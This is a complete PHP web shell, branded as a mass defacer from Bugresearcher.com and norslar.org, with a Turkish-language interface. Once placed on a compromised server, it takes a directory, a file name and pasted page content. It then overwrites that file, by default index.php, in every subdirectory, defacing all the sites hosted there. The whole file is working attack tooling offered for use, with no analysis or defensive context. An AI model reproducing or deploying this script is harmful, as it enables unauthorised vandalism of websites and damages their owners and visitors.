<?php ?><?php
/*
  
Mass Deface Script | Katib| Bugresearcher.Com
  
Adres => http://www.Bugresearcher.com/
  
*/
echo "<center><img src='https://scontent-frt3-2.xx.fbcdn.net/v/t1.0-9/16938648_740186476151118_2254681172936296111_n.jpg?oh=92947eb85da9ff09381961c16cea81e7&oe=5AFE1A1B'></center>";
echo "<br>";
echo "<br>";
echo "<title>Bugresearcher.com Mass Defacer Shell</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'></center>";
echo "<center>DIZIN: <input type='text' name='base_dir' size='40' value='" . getcwd() . "'></center><br><br>";
echo "<center>DOSYA ADI : <input type='text' name='file_name' value='index.php'></center><br><br>";
echo "<center>INDEX : <br><textarea style='width: 685px; height: 250px;' name='index'>INDEX KODLARINI BURAYA YAPISTIR</textarea></center><br>";
echo "<center><input type='submit' value='HACKLE!'></form></center>";
echo "<br>";
echo "<body bgcolor='black'><font color='red'><font face='Electrolize'>";
echo "<center>norslar.org - The Elite Hackers Group</center><br>";
if (isset($_POST['base_dir'])) {
    if (!file_exists($_POST['base_dir'])) die($_POST['base_dir'] . " BULUNAMADI !<br>");
    if (!is_dir($_POST['base_dir'])) die($_POST['base_dir'] . " DIZIN DEGIL !<br>");
    @chdir($_POST['base_dir']) or die("DIZIN ACILAMADI");
    $files = @scandir($_POST['base_dir']) or die("TAMAMDIR<br>");
    foreach ($files as $file):
        if ($file != "." && $file != ".." && @filetype($file) == "dir") {
            $index = getcwd() . "/" . $file . "/" . $_POST['file_name'];
            if (file_put_contents($index, $_POST['index'])) echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>TAMAMDIR!</span><br>";
        }
    endforeach;
}
?>
